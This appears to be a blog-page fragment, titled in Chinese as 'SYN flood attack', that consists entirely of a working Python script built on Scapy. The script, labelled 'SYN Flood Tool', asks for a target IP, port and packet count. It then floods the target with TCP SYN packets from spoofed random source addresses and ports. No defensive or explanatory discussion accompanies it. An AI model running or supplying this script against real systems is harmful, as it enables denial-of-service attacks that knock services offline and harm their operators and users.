        <h1 id="SYN洪泛攻击"><a href="#SYN洪泛攻击" class="headerlink" title="SYN洪泛攻击"></a>SYN洪泛攻击</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 生成随机的IP</span><br><span class="line">def randomIP():</span><br><span class="line">    ip = &quot;.&quot;.join(map(str, (random.randint(0, 255) for i in range(4))))</span><br><span class="line">    return ip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 生成随机端口</span><br><span class="line">def randomPort():</span><br><span class="line">    port = random.randint(1000, 10000)</span><br><span class="line">    return port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># syn-flood</span><br><span class="line">def synFlood(count, dstIP, dstPort):</span><br><span class="line">    total = 0</span><br><span class="line">    print(&quot;Packets are sending ...&quot;)</span><br><span class="line">    for i in range(count):</span><br><span class="line">        # IPlayer</span><br><span class="line">        srcIP = randomIP()</span><br><span class="line">        dstIP = dstIP</span><br><span class="line">        IPlayer = IP(src=srcIP, dst=dstIP)</span><br><span class="line">        # TCPlayer</span><br><span class="line">        srcPort = randomPort()</span><br><span class="line">        TCPlayer = TCP(sport=srcPort, dport=dstPort, flags=&quot;S&quot;)</span><br><span class="line">        # 发送包</span><br><span class="line">        packet = IPlayer / TCPlayer</span><br><span class="line">        send(packet)</span><br><span class="line">        total += 1</span><br><span class="line">    print(&quot;Total packets sent: %i&quot; % total)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 显示的信息</span><br><span class="line">def info():</span><br><span class="line">    print(&quot;#&quot; * 30)</span><br><span class="line">    print(&quot;# Welcome to SYN Flood Tool  #&quot;)</span><br><span class="line">    print(&quot;#&quot; * 30)</span><br><span class="line">    # 输入目标IP和端口</span><br><span class="line">    dstIP = input(&quot;Target IP : &quot;)</span><br><span class="line">    dstPort = int(input(&quot;Target Port : &quot;))</span><br><span class="line">    return dstIP, dstPort</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    dstIP, dstPort = info()</span><br><span class="line">    count = int(input(&quot;Please input the number of packets：&quot;))</span><br><span class="line">    synFlood(count, dstIP, dstPort)</span><br></pre></td></tr></table></figure>
